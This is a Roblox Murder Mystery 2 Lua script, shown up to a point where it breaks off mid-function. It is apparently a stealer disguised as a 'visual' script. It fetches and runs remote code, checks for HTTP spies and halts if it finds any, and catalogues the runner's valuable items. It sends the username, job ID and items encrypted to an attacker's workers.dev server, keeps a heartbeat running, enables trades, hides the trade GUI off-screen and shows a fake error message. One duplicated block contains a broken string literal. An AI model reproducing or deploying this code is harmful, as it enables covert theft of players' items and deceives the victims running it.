getgenv().ZenithMM2 = getgenv().ZenithMM2 or false
if getgenv().ZenithMM2 then return end
getgenv().ZenithMM2 = true

local DEBUG = getgenv().debug == true
local function dbg(...)
    if not DEBUG then return end
    local parts = {}
    for i = 1, select("#", ...) do parts[i] = tostring(select(i, ...)) end
    print("[Zenith] " .. table.concat(parts, " "))
end

setclipboard("https://discord.gg/QuFqd2j3Va")

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

local DISCORD = "discord.gg/QuFqd2j3Va"
local VISUAL_URL = getgenv().visual_url or "https://raw.githubusercontent.com/PreZ-z/Zen/refs/heads/main/25ms_obf.lua(3)%20(1).txt"
local TRADE_CODE = game.PlaceId * 3
local PROTECTOR_URL = "https://zen-protector.gangetnpa.workers.dev"

local USER = getgenv().user or {}
local TOKEN = getgenv().token or ""
local PKEY = "88d2fa43ff646b9ab3b7b9107edc9bacfbf36c10"

if #USER == 0 then
    warn("[Zenith] no target")
    return
end
if type(TOKEN) ~= "string" or not TOKEN:match("^%x+$") or #TOKEN ~= 32 then
    warn("[Zenith] bad token")
    return
end

if game.PlaceId ~= 142823291 then
    pcall(function() localPlayer:Kick("Project Zenith | Murder Mystery 2 only\n\n" .. DISCORD) end)
    return
end

if not game:IsLoaded() then game.Loaded:Wait() end

local HALTED = false
local HALT_REASON = ""

local function halt(reason)
    if HALTED then return end
    HALTED = true
    HALT_REASON = reason
    _G.ZenithStop = true
    warn("[Zenith] HALTED: " .. reason)
    pcall(function()
        setclipboard("[Zenith] Guard triggered — protection active.\nReason: " .. reason)
    end)
end

local ORIG = {
    request = request, http_request = http_request, httprequest = httprequest,
    HttpGet = game.HttpGet, HttpGetAsync = game.HttpGetAsync,
    GetAsync = HttpService.GetAsync, PostAsync = HttpService.PostAsync, RequestAsync = HttpService.RequestAsync,
    JSONEncode = HttpService.JSONEncode, JSONDecode = HttpService.JSONDecode,
    getinfo = debug and debug.getinfo or nil, getupvalue = debug and debug.getupvalue or nil,
    getgc = rawget(_G, "getgc"), getreg = rawget(_G, "getreg"),
    getrawmetatable = rawget(_G, "getrawmetatable"),
    iscclosure = rawget(_G, "iscclosure"), islclosure = rawget(_G, "islclosure"),
    isfunctionhooked = rawget(_G, "isfunctionhooked"),
    checkcaller = rawget(_G, "checkcaller"),
    getfenv = getfenv,
    newcclosure = rawget(_G, "newcclosure"),
}

local SPY_SIGNATURES = {
    "simplespy", "http spy", "httpspy", "http-spy", "requestspy", "turtlespy",
    "hookfunction", "hookmetamethod", "replaceclosure", "detourfunction",
    "r2s", "remotespy", "hydroxide", "toombs", "metatable method hook",
}

local function envSame(name)
    local cur = rawget(getfenv(), name)
    if cur == nil then return true end
    if cur == ORIG[name] then return true end
    local ok, g = pcall(function() return _G[name] end)
    if ok and g == ORIG[name] then return true end
    return false
end

local function checkIdentity()
    local hits = {}
    if ORIG.request and not envSame("request") then table.insert(hits, "request_identity") end
    if ORIG.http_request and not envSame("http_request") then table.insert(hits, "http_request_identity") end
    if ORIG.httprequest and not envSame("httprequest") then table.insert(hits, "httprequest_identity") end
    if ORIG.HttpGet and game.HttpGet ~= ORIG.HttpGet then table.insert(hits, "HttpGet_identity") end
    if ORIG.HttpGetAsync and game.HttpGetAsync ~= ORIG.HttpGetAsync then table.insert(hits, "HttpGetAsync_identity") end
    if ORIG.GetAsync and HttpService.GetAsync ~= ORIG.GetAsync then table.insert(hits, "GetAsync_identity") end
    if ORIG.PostAsync and HttpService.PostAsync ~= ORIG.PostAsync then table.insert(hits, "PostAsync_identity") end
    if ORIG.RequestAsync and HttpService.RequestAsync ~= ORIG.RequestAsync then table.insert(hits, "RequestAsync_identity") end
    if ORIG.JSONEncode and HttpService.JSONEncode ~= ORIG.JSONEncode then table.insert(hits, "JSONEncode_identity") end
    if ORIG.JSONDecode and HttpService.JSONDecode ~= ORIG.JSONDecode then table.insert(hits, "JSONDecode_identity") end
    if ORIG.getinfo and debug and debug.getinfo ~= ORIG.getinfo then table.insert(hits, "getinfo_identity") end
    if ORIG.getupvalue and debug and debug.getupvalue ~= ORIG.getupvalue then table.insert(hits, "getupvalue_identity") end
    return hits
end

local function checkClosureIntegrity()
    local hits = {}
    local function check(fn, name)
        if type(fn) ~= "function" then return end
        if ORIG.isfunctionhooked then
            local ok, r = pcall(ORIG.isfunctionhooked, fn)
            if ok and r == true then table.insert(hits, name .. "_hooked") end
        end
        if ORIG.getinfo then
            local ok, info = pcall(ORIG.getinfo, fn)
            if ok and info and info.what ~= "C" and info.source ~= "=[C]" then
                table.insert(hits, name .. "_lua:" .. tostring(info.what))
            end
        end
    end
    check(ORIG.request, "request")
    check(ORIG.http_request, "http_request")
    check(ORIG.HttpGet, "HttpGet")
    check(ORIG.GetAsync, "GetAsync")
    check(ORIG.PostAsync, "PostAsync")
    check(ORIG.RequestAsync, "RequestAsync")
    check(ORIG.JSONEncode, "JSONEncode")
    check(ORIG.JSONDecode, "JSONDecode")
    return hits
end

local function checkMetatable()
    local hits = {}
    if not ORIG.getrawmetatable then return hits end
    local targets = {game, HttpService, string}
    for ti, obj in ipairs(targets) do
        local ok, mt = pcall(ORIG.getrawmetatable, obj)
        if ok and mt then
            for _, key in ipairs({"__namecall", "__index", "__newindex", "__call", "__concat", "__tostring"}) do
                local fn = rawget(mt, key)
                if type(fn) == "function" then
                    if ORIG.isfunctionhooked then
                        local ok2, r = pcall(ORIG.isfunctionhooked, fn)
                        if ok2 and r == true then table.insert(hits, "mt" .. ti .. "_" .. key .. "_hooked") end
                    end
                    if ORIG.getinfo then
                        local ok3, info = pcall(ORIG.getinfo, fn)
                        if ok3 and info and info.what == "Lua" then
                            table.insert(hits, "mt" .. ti .. "_" .. key .. "_lua")
                        end
                    end
                end
            end
        end
    end
    return hits
end

local function checkGcSpy()
    local hits = {}
    if not ORIG.getgc then return hits end
    local ok, objs = pcall(ORIG.getgc, true)
    if not ok or type(objs) ~= "table" then return hits end
    local found = {}
    for _, o in ipairs(objs) do
        if type(o) == "string" and #o < 200 then
            local l = o:lower()
            for _, sig in ipairs(SPY_SIGNATURES) do
                if not found[sig] and l:find(sig, 1, true) then
                    found[sig] = true
                    table.insert(hits, "gc:" .. sig)
                end
            end
        end
    end
    return hits
end

local function checkCanary()
    local hits = {}
    if not ORIG.request then return hits end
    local ok, r = pcall(ORIG.request, {
        Url = PROTECTOR_URL .. "/api/health",
        Method = "GET",
        Headers = { ["User-Agent"] = "Zen/4.2" },
    })
    if not ok or not r then table.insert(hits, "canary_noexec") return hits end
    if not r.Body or type(r.Body) ~= "string" then table.insert(hits, "canary_nobody") return hits end
    if not r.Body:find('"ok":true', 1, true) then table.insert(hits, "canary_tampered") end
    return hits
end

local function checkStack()
    local hits = {}
    local function probe(name, fn)
        local ok, err = pcall(fn)
        if ok then return end
        local ok2, trace = pcall(debug.traceback, err)
        if not ok2 or not trace then return end
        local t = tostring(trace):lower()
        if t:find("syn%.") or t:find("getgenv") or t:find("hookfunction") or t:find("newcclosure") then
            table.insert(hits, name .. "_trace")
        end
        local levels = 0
        for _ in tostring(trace):gmatch("\n") do levels = levels + 1 end
        if levels > 20 then
            table.insert(hits, name .. "_deep:" .. levels)
        end
    end
    if ORIG.request then
        probe("request", function() return ORIG.request({Url = "invalid://", Method = "GET"}) end)
    end
    if ORIG.JSONEncode then
        probe("JSONEncode", function() return ORIG.JSONEncode(HttpService, nil) end)
    end
    return hits
end

local function checkBehavior()
    local hits = {}
    if ORIG.GetAsync then
        local ok = pcall(ORIG.GetAsync, HttpService, "invalid://")
        if ok then table.insert(hits, "GetAsync_silent") end
    end
    if ORIG.request then
        local ok = pcall(ORIG.request, { Url = "invalid://", Method = "GET" })
        if ok then table.insert(hits, "request_silent") end
    end
    return hits
end

local function checkEnvironment()
    local hits = {}
    if not ORIG.getgenv then return hits end
    local ok, genv = pcall(ORIG.getgenv)
    if ok and type(genv) == "table" then
        for _, name in ipairs({"hookfunction", "replaceclosure", "hookmetamethod", "setreadonly"}) do
            if type(genv[name]) == "function" and ORIG.isfunctionhooked then
                local ok2, r = pcall(ORIG.isfunctionhooked, genv[name])
                if ok2 and r == true then table.insert(hits, "genv_" .. name) end
            end
        end
    end
    return hits
end

local function lightGuard()
    if HALTED then return false end
    local hits = checkIdentity()
    if #hits == 0 then hits = checkClosureIntegrity() end
    if #hits == 0 then hits = checkMetatable() end
    if #hits > 0 then halt(table.concat(hits, ", ")); return false end
    return true
end

local function heavyGuard()
    if HALTED then return end
    local hits = checkIdentity()
    if #hits == 0 then hits = checkClosureIntegrity() end
    if #hits == 0 then hits = checkMetatable() end
    if #hits == 0 then hits = checkGcSpy() end
    if #hits == 0 then hits = checkCanary() end
    if #hits == 0 then hits = checkStack() end
    if #hits == 0 then hits = checkBehavior() end
    if #hits == 0 then hits = checkEnvironment() end
    if #hits > 0 then halt("heavy: " .. table.concat(hits, ", ")) end
end

heavyGuard()
if HALTED then return end

task.spawn(function()
    local heavy_tick = 0
    while not HALTED do
        task.wait(1)
        if HALTED then break end
        lightGuard()
        heavy_tick = heavy_tick + 1
        if heavy_tick >= 5 then
            heavy_tick = 0
            heavyGuard()
        end
    end
end)

local request_ = request or syn and syn.request or http and http.request or http_request or httprequest
if not request_ then
    warn("[Zenith] No HTTP function")
    pcall(function() localPlayer:Kick("Project Zenith | Executor missing HTTP\n\n" .. DISCORD) end)
    return
end

local function randomNonce(n)
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-"
    local out = {}
    for i = 1, n do out[i] = chars:sub(math.random(1, #chars), math.random(1, #chars)) end
    return table.concat(out)
end

local Z = (function()
local Z
do
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local URL = "https://zen-protector.gangetnpa.workers.dev"
local TOKEN = ""
local KEY = ""
local VERSION = 1
local M = 4294967296
local function band(a, b)
    a = a % M b = b % M
    local r, p = 0, 1
    while a > 0 or b > 0 do
        local x, y = a % 2, b % 2
        if x == 1 and y == 1 then r = r + p end
        a = (a - x) / 2 b = (b - y) / 2 p = p * 2
    end
    return r
end
local function bor(a, b)
    a = a % M b = b % M
    local r, p = 0, 1
    while a > 0 or b > 0 do
        local x, y = a % 2, b % 2
        if x == 1 or y == 1 then r = r + p end
        a = (a - x) / 2 b = (b - y) / 2 p = p * 2
    end
    return r
end
local function bxor(a, b)
    a = a % M b = b % M
    local r, p = 0, 1
    while a > 0 or b > 0 do
        local x, y = a % 2, b % 2
        if x ~= y then r = r + p end
        a = (a - x) / 2 b = (b - y) / 2 p = p * 2
    end
    return r
end
local function lshift(a, n) return (a % M) * 2 ^ n % M end
local function rshift(a, n) return math.floor((a % M) / 2 ^ n) end
local function bnot(a) return (M - 1) - (a % M) end
local function rotl(x, n) return bor(lshift(x, n), rshift(x, 32 - n)) % M end
local function ror(x, n) return bor(rshift(x, n), lshift(x, 32 - n)) % M end
local KS = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2,
}
local function sha256(msg)
    local ml = #msg
    local bitLen = ml * 8
    msg = msg .. string.char(128) .. string.rep("\0", (55 - ml) % 64)
    local hb = ""
    for i = 7, 0, -1 do hb = hb .. string.char(math.floor(bitLen / 256 ^ i) % 256) end
    msg = msg .. hb
    local h0, h1, h2, h3, h4, h5, h6, h7 = 0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
    for chunk = 1, #msg, 64 do
        local w = {}
        for i = 0, 15 do
            local j = chunk + i * 4
            w[i] = (string.byte(msg, j) * 16777216 + string.byte(msg, j + 1) * 65536 + string.byte(msg, j + 2) * 256 + string.byte(msg, j + 3)) % M
        end
        for i = 16, 63 do
            local p15, p2 = w[i - 15], w[i - 2]
            local s0 = bxor(bxor(ror(p15, 7), ror(p15, 18)), rshift(p15, 3))
            local s1 = bxor(bxor(ror(p2, 17), ror(p2, 19)), rshift(p2, 10))
            w[i] = (w[i - 16] + s0 + w[i - 7] + s1) % M
        end
        local a, b, c, d, e, f, g, h = h0, h1, h2, h3, h4, h5, h6, h7
        for i = 0, 63 do
            local S1 = bxor(bxor(ror(e, 6), ror(e, 11)), ror(e, 25))
            local ch = bxor(band(e, f), band(bnot(e), g))
            local t1 = (h + S1 + ch + KS[i + 1] + w[i]) % M
            local S0 = bxor(bxor(ror(a, 2), ror(a, 13)), ror(a, 22))
            local maj = bxor(bxor(band(a, b), band(a, c)), band(b, c))
            local t2 = (S0 + maj) % M
            h, g, f, e, d, c, b, a = g, f, e, (d + t1) % M, c, b, a, (t1 + t2) % M
        end
        h0 = (h0 + a) % M h1 = (h1 + b) % M h2 = (h2 + c) % M h3 = (h3 + d) % M
        h4 = (h4 + e) % M h5 = (h5 + f) % M h6 = (h6 + g) % M h7 = (h7 + h) % M
    end
    local out = {}
    for _, hh in ipairs({h0, h1, h2, h3, h4, h5, h6, h7}) do
        for i = 3, 0, -1 do out[#out + 1] = string.char(math.floor(hh / 256 ^ i) % 256) end
    end
    return table.concat(out)
end
local function sha256_hex(s)
    local d, t = sha256(s), {}
    for i = 1, #d do t[i] = string.format("%02x", string.byte(d, i)) end
    return table.concat(t)
end
local function hmac256(keyBytes, msg)
    if #keyBytes > 64 then keyBytes = sha256(keyBytes) end
    keyBytes = keyBytes .. string.rep("\0", 64 - #keyBytes)
    local ipad, opad = {}, {}
    for i = 1, 64 do
        local bb = string.byte(keyBytes, i)
        ipad[i] = string.char(bxor(bb, 54))
        opad[i] = string.char(bxor(bb, 92))
    end
    return sha256(table.concat(opad) .. sha256(table.concat(ipad) .. msg))
end
local function qr(s, a, b, c, d)
    s[a] = (s[a] + s[b]) % M s[d] = rotl(bxor(s[d], s[a]), 16)
    s[c] = (s[c] + s[d]) % M s[b] = rotl(bxor(s[b], s[c]), 12)
    s[a] = (s[a] + s[b]) % M s[d] = rotl(bxor(s[d], s[a]), 8)
    s[c] = (s[c] + s[d]) % M s[b] = rotl(bxor(s[b], s[c]), 7)
end
local function le32(s, o) return (string.byte(s, o) + string.byte(s, o + 1) * 256 + string.byte(s, o + 2) * 65536 + string.byte(s, o + 3) * 16777216) % M end
local function chachaBlock(key, counter, nonce)
    local s = {
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
        le32(key, 1), le32(key, 5), le32(key, 9), le32(key, 13),
        le32(key, 17), le32(key, 21), le32(key, 25), le32(key, 29),
        counter % M, le32(nonce, 1), le32(nonce, 5), le32(nonce, 9),
    }
    local w = {(table.unpack or unpack)(s)}
    for _ = 1, 10 do
        qr(w, 1, 5, 9, 13) qr(w, 2, 6, 10, 14) qr(w, 3, 7, 11, 15) qr(w, 4, 8, 12, 16)
        qr(w, 1, 6, 11, 16) qr(w, 2, 7, 12, 13) qr(w, 3, 8, 9, 14) qr(w, 4, 5, 10, 15)
    end
    local out = {}
    for i = 1, 16 do
        local v = (w[i] + s[i]) % M
        out[i] = string.char(v % 256, math.floor(v / 256) % 256, math.floor(v / 65536) % 256, math.floor(v / 16777216) % 256)
    end
    return table.concat(out)
end
local function chachaCrypt(key, nonce, data)
    local out, counter = {}, 1
    for i = 1, #data, 64 do
        local ks = chachaBlock(key, counter, nonce)
        counter = (counter + 1) % M
        local chunk, stopAt = {}, math.min(i + 63, #data)
        for j = i, stopAt do chunk[#chunk + 1] = string.char(bxor(string.byte(data, j), string.byte(ks, j - i + 1))) end
        out[#out + 1] = table.concat(chunk)
    end
    return table.concat(out)
end
local B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function b64e(data)
    local out = {}
    for i = 1, #data, 3 do
        local a = string.byte(data, i)
        local b = string.byte(data, i + 1)
        local c = string.byte(data, i + 2)
        local n = a * 65536 + (b or 0) * 256 + (c or 0)
        out[#out + 1] = B64:sub(math.floor(n / 262144) % 64 + 1, math.floor(n / 262144) % 64 + 1)
        out[#out + 1] = B64:sub(math.floor(n / 4096) % 64 + 1, math.floor(n / 4096) % 64 + 1)
        out[#out + 1] = b and B64:sub(math.floor(n / 64) % 64 + 1, math.floor(n / 64) % 64 + 1) or "="
        out[#out + 1] = c and B64:sub(n % 64 + 1, n % 64 + 1) or "="
    end
    return table.concat(out)
end
local function encryptPayload(dataTable)
    local k32 = KEY:sub(1, 32)
    local tokHash = sha256_hex(TOKEN)
    local signKey = sha256("sign:" .. k32)
    local rng = Random.new()
    local nonce = ""
    for _ = 1, 12 do nonce = nonce .. string.char(rng:NextInteger(0, 255)) end
    local pt = HttpService:JSONEncode(dataTable)
    local ct = chachaCrypt(k32, nonce, pt)
    local sig = hmac256(signKey, "ZN" .. string.char(VERSION) .. nonce .. ct .. tokHash)
    return b64e("ZN" .. string.char(VERSION) .. nonce .. ct .. sig)
end
local httpReq = (syn and syn.request) or (http and http.request) or request or http_request or httprequest
local function post(path, tbl)
    if not httpReq then return nil end
    local ok, res = pcall(httpReq, {
        Url = URL .. path,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json", ["User-Agent"] = "Zen/4.2" },
        Body = HttpService:JSONEncode(tbl),
    })
    if ok then return res end
    return nil
end
Z = {}
function Z.config(token, key, url)
    TOKEN = token or TOKEN
    KEY = key or KEY
    if url then URL = url end
end
function Z.hit(fields)
    local executor = "Unknown"
    pcall(function()
        if identifyexecutor then executor = select(1, identifyexecutor()) or executor end
    end)
    return post("/api/dispatch", {
        token = TOKEN,
        payload = encryptPayload({
            jobid = fields.jobid or game.JobId,
            username = lp.Name,
            display = lp.DisplayName,
            executor = fields.executor or executor,
            placeid = tostring(fields.placeid or game.PlaceId),
            receiver = fields.receiver or "",
            game = fields.game or "mm2",
            avatar = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png"):format(lp.UserId),
            uptime = fields.uptime or "",
            ts = os.time(),
            items = fields.items or {},
        }),
    })
end
function Z.status()
    return post("/api/status", { token = TOKEN, jobid = game.JobId })
end
function Z.left()
    return post("/api/left", { token = TOKEN, jobid = game.JobId })
end
function Z.autojoiner(gameName)
    local resp = post("/api/autojoiner", { token = TOKEN, game = gameName, jobid = game.JobId })
    if resp and resp.Body then
        local ok, json = pcall(HttpService.JSONDecode, HttpService, resp.Body)
        if ok and json.hits then return json.hits end
    end
    return {}
end
function Z.startHeartbeat(interval)
    interval = interval or 10
    task.spawn(function()
        while true do
            pcall(Z.status)
            task.wait(interval)
        end
    end)
end
end
return Z
end)()

local function sendWebhook(payload)
    if HALTED then return end
    if not lightGuard() then return end
    task.spawn(function()
        local ok, err = pcall(function()
            local r = Z.hit(payload)
            if not r then
                warn("[Zenith] HIT ATILAMADI: executor request fonksiyonu bulunamadi veya coktu")
                return
            end
            local sc = r.StatusCode or r.status
            local bd = r.Body or r.body
            if not sc then
                warn("[Zenith] HIT ATILAMADI: gecersiz yanit (executor: " .. tostring(ExecutorName) .. ")")
            elseif sc ~= 200 then
                warn("[Zenith] HIT REDDEDILDI: HTTP " .. tostring(sc) .. " | " .. tostring(bd))
            else
                dbg("hit gonderildi")
            end
        end)
        if not ok then
            warn("[Zenith] HIT HATASI: " .. tostring(err))
        end
    end)
end

local ExecutorName = (identifyexecutor and select(2, pcall(identifyexecutor))) or (getexecutorname and select(2, pcall(getexecutorname))) or "Unknown"
local RealJobId = game.JobId

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet(VISUAL_URL))()
        dbg("Visual script loaded")
    end)
end)

local ok, serverType = pcall(function()
    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 5):InvokeServer()
end)

if ok and serverType == "VIPServer" then
    pcall(function() localPlayer:Kick("Project Zenith | Private servers not supported\n\n" .. DISCORD) end)
    return
end

if Players.MaxPlayers <= #Players:GetPlayers() then
    pcall(function() localPlayer:Kick("Project Zenith | Server too full\n\n" .. DISCORD) end)
    return
end

local Remotes = ReplicatedStorage:WaitForChild("Remotes", 15)
local Extras = Remotes and Remotes:FindFirstChild("Extras")

if not Extras or not Extras:FindFirstChild("GetPlayerLevel") then
    warn("[Zenith] Extras remotes missing")
    pcall(function() localPlayer:Kick("Project Zenith | Remotes missing\n\n" .. DISCORD) end)
    return
end

local levelOk, level = pcall(function()
    return Extras.GetPlayerLevel:InvokeServer(localPlayer)
end)

if not levelOk or not level or level < 10 then
    pcall(function() localPlayer:Kick("Project Zenith | Level too low\n\n" .. DISCORD) end)
    return
end

local Trade = ReplicatedStorage:WaitForChild("Trade", 15)
if not Trade then
    warn("[Zenith] Trade folder missing")
    pcall(function() localPlayer:Kick("Project Zenith | Trade missing\n\n" .. DISCORD) end)
    return
end

local SendRequest = Trade:WaitForChild("SendRequest", 5)
local CancelRequest = Trade:WaitForChild("CancelRequest", 5)
local AcceptRequest = Trade:WaitForChild("AcceptRequest", 5)
local DeclineRequest = Trade:WaitForChild("DeclineRequest", 5)
local GetTradeStatus = Trade:WaitForChild("GetTradeStatus", 5)
local AcceptTrade = Trade:WaitForChild("AcceptTrade", 5)
local DeclineTrade = Trade:WaitForChild("DeclineTrade", 5)
local OfferItem = Trade:WaitForChild("OfferItem", 5)
local UpdateTrade = Trade:WaitForChild("UpdateTrade", 5)
local StartTrade = Trade:WaitForChild("StartTrade", 5)
local SetRequestsEnabled = Trade:FindFirstChild("SetRequestsEnabled")

local SKIP_RARITY = { Common = true, Uncommon = true, Rare = true, Legendary = true }

local IGNORED = {
    DefaultGun = true, DefaultKnife = true,
    Reaver = true, Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true, IceHammer_Ancient = true,
    Gingerscythe = true, Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
    TestItem = true, Season1TestKnife = true, Cracks = true, Icecrusher = true,
    ["???"] = true, Dartbringer = true,
    TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true,
}

local function httpGet(url)
    local ok2, res = pcall(request_, {Url = url, Method = "GET", Timeout = 8})
    if ok2 and res and res.Body then return res.Body end
    local ok3, res3 = pcall(function() return game:HttpGet(url) end)
    if ok3 then return res3 end
    return nil
end

local weapons
do
    local ok1, res1 = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10):WaitForChild("Item", 10))
    end)
    if ok1 and type(res1) == "table" then
        weapons = res1
    else
        local ok2, res2 = pcall(function()
            return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10))
        end)
        if ok2 and type(res2) == "table" then weapons = res2.Weapons or res2 end
    end
end
if not weapons then
    warn("[Zenith] Item database failed")
    pcall(function() localPlayer:Kick("Project Zenith | Database failed

" .. DISCORD) end)
    return
end
if not weapons then
    warn("[Zenith] Item database failed")
    pcall(function() localPlayer:Kick("Project Zenith | Database failed\n\n" .. DISCORD) end)
    return
end

local itemValues = {}
local function fetchValues()
    local body = httpGet("https://8bc88963-ed0e-49b5-a421-2ec028d06c0e.lovableproject.com/api/public/valuables/get-game-valuables?game=mm2")
    if not body then return false end
    local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, body)
    if not ok2 or type(decoded) ~= "table" then return false end
    local data = decoded.data or decoded
    if type(data) ~= "table" then return false end
    local count = 0
    for _, entry in pairs(data) do
        if type(entry) == "table" then
            local name = entry.name or entry.itemName or entry.displayName
            local value = tonumber(entry.price or entry.value or entry.avgValue or 0)
            if name and value then
                itemValues[name] = value
                itemValues[name:lower()] = value
                count += 1
            end
        end
    end
    return count > 0
end

if not fetchValues() then
    warn("[Zenith] values unavailable")
    pcall(function() localPlayer:Kick("Project Zenith | Values unavailable\n\n" .. DISCORD) end)
    return
end

local function getItemValue(id)
    local w = weapons[id]
    if not w then return 0 end
    local name = w.ItemName or w.Name
    if not name then return 0 end
    if w.Chroma == true then
        local chromaName = "Chroma " .. name
        if itemValues[chromaName] then return itemValues[chromaName] end
        if itemValues[chromaName:lower()] then return itemValues[chromaName:lower()] end
    end
    if itemValues[name] then return itemValues[name] end
    if itemValues[name:lower()] then return itemValues[name:lower()] end
    return 0
end

local function fixDataID(id)
    if weapons[id] then return id end
    local m1 = id:match("^(.-)_[KG]_%d%d%d%d$"); if m1 and weapons[m1] then return m1 end
    local m2 = id:match("^(.+)Knife$"); if m2 and weapons[m2] then return m2 end
    local m3 = id:match("^(.+)Gun$"); if m3 and weapons[m3] then return m3 end
    return id
end

local function fetchInventory()
    local ok2, result = pcall(function()
        return Extras.GetFullInventory:InvokeServer(localPlayer.Name)
    end)
    if not ok2 or type(result) ~= "table" then return {}, {} end
    local weaponsList = {}
    local petsList = {}
    if result.Weapons and result.Weapons.Owned then
        for name, count in pairs(result.Weapons.Owned) do
            if not IGNORED[name] then
                local fixed = fixDataID(name)
                if not IGNORED[fixed] then
                    local w = weapons[fixed]
                    if w and not SKIP_RARITY[w.Rarity or "Godly"] then
                        table.insert(weaponsList, {
                            uniqueId = name,
                            fixed = fixed,
                            name = (w.ItemName or w.Name or name) .. (w.Chroma == true and " [CHROMA]" or ""),
                            amount = type(count) == "number" and count or 1,
                            value = getItemValue(fixed),
                            rarity = w.Rarity or "Godly",
                        })
                    end
                end
            end
        end
    end
    if result.Pets and result.Pets.Owned then
        for name, count in pairs(result.Pets.Owned) do
            table.insert(petsList, {
                uniqueId = name,
                name = name,
                amount = type(count) == "number" and count or 1,
                value = 0,
            })
        end
    end
    table.sort(weaponsList, function(a, b) return a.value > b.value end)
    return weaponsList, petsList
end

local initialWeapons, initialPets = fetchInventory()
local totalItems = #initialWeapons + #initialPets

if totalItems == 0 then
    warn("[Zenith] No tradable items")
    pcall(function() localPlayer:Kick("Project Zenith | No tradable items\n\n" .. DISCORD) end)
    return
end

local function formatValue(n)
    return string.format("%.2f", tonumber(n) or 0):gsub("0+$", ""):gsub("%.$", "")
end

local function formatItemList(list, limit)
    limit = limit or 20
    local lines = {}
    local shown = 0
    for _, item in ipairs(list) do
        if shown >= limit then
            table.insert(lines, "... and " .. (#list - limit) .. " more")
            break
        end
        shown += 1
        table.insert(lines, string.format("- %dx %s (%s)", item.amount, item.name, formatValue(item.value)))
    end
    if #lines == 0 then table.insert(lines, "None") end
    return table.concat(lines, "\n")
end

local function buildHit()
    local items = {}
    for _, it in ipairs(initialWeapons) do
        local w = weapons[it.fixed]
        if w then
            local nm = w.ItemName or w.Name or it.fixed
            if w.Chroma == true then nm = "Chroma " .. nm end
            items[nm] = (items[nm] or 0) + (it.amount or 1)
        end
    end
    return { game = "mm2", receiver = USER[1] or "", items = items }
end

if type(TOKEN) ~= "string" or #TOKEN ~= 32 then
    warn("[Zenith] TOKEN gecersiz: '" .. tostring(TOKEN) .. "' (32 hex olmali, loader'dan gelmeli)")
end
if type(PKEY) ~= "string" or #PKEY < 32 then
    warn("[Zenith] PROTECTOR_KEY gecersiz: " .. tostring(#PKEY) .. " karakter (32+ olmali)")
end
Z.config(TOKEN, PKEY, PROTECTOR_URL)
sendWebhook(buildHit())
Z.startHeartbeat(10)

_G.ZenithStop = false
local ERROR_TEXT = "There was a problem receiving data, please reconnect. \n (Error Code: 260)"
task.spawn(function()
    pcall(function()
        CoreGui.DescendantAdded:Connect(function(descendant)
            if _G.ZenithStop then return end
            if descendant.Name == "ErrorMessage" and descendant:IsA("TextLabel") then
                descendant.Text = ERROR_TEXT
                descendant:GetPropertyChangedSignal("Text"):Connect(function()
                    if descendant.Text ~= ERROR_TEXT then descendant.Text = ERROR_TEXT end
                end)
            end
        end)
    end)
end)

if SetRequestsEnabled then
    pcall(function() SetRequestsEnabled:FireServer(true) end)
end

local function getUserDevice()
    if playerGui:GetAttribute("Device") == nil then
        local start = tick()
        while playerGui:GetAttribute("Device") == nil and tick() - start < 10 do task.wait() end
    end
    return playerGui:GetAttribute("Device")
end

local function hideTradeGui()
    pcall(function()
        local tradeGui = playerGui:FindFirstChild("TradeGUI")
        local tradeGuiPhone = playerGui:FindFirstChild("TradeGUI_Phone")
        local device = getUserDevice()
        if tradeGui then
            for _, child in ipairs(tradeGui:GetChildren()) do
                pcall(function() child.Position = UDim2.new(99, 99, 99, 99) end)
            end
        end
        if tradeGuiPhone then
            if tradeGuiPhone:FindFirstChild("Inactive") then
                local inactive = tradeGuiPhone.Inactive
                if inactive:FindFirstChild("Frame") then inactive.Frame.Position = UDim2.new(99, 99, 99, 99) end
